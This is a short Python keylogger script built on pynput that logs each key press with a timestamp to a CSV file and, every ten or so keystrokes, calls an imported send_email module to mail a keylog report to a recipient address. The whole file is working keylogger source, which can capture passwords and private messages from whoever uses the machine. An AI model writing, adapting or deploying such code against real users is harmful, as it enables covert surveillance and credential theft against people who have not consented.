import pynput
from pynput.keyboard import Key, Listener
# Imported the mailing file
import send_email
#Imported date time and csv Files
import datetime
import csv

count = 0
keys = []
Stamp=[]
Today_date = str(datetime.date.fromtimestamp(datetime.datetime.now().timestamp()))

#Timestamp for the data 
def timestamp():
    current_time = datetime.datetime.now()
    time_stamp = current_time.timestamp()
    date_time = datetime.datetime.fromtimestamp(time_stamp)
    str_date_time = date_time.strftime("%d-%m-%Y, %H:%M:%S.%f")
    return str_date_time


def on_press(key):
    #Show the keys pressed in the console and send data when more than 10 keys are pressed
    print(key, end= " ")
    global keys, count, Stamp
    keys.append(str(key))
    Stamp.append(timestamp())
    count += 1
    if count > 10:
        count = 0
        adddata()
        print(keys)
        print(Stamp)
        keys=[]
        Stamp=[]
        email()       

#Mailing to the resipirnt address
def email():
    global Today_date
    message = "This the Keylog for the Date:" + Today_date
    send_email.sendEmail(message)

#Writing the data in the csv file 
def adddata():
    global keys, Stamp
    # fields = ['TIMESTAMP', 'KEY PRESSED']
    rows = [None]*len(keys)
    for i in range(len(keys)):
        rows[i]=[Stamp[i],keys[i]]
    
    with open('Datafile/data.csv', mode ='a', newline='') as file:
     csvwriter = csv.writer(file) 
     csvwriter.writerows(rows)
    #  csvwriter.writerow(fields)     
    
def on_release(key):
    if key == Key.end:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
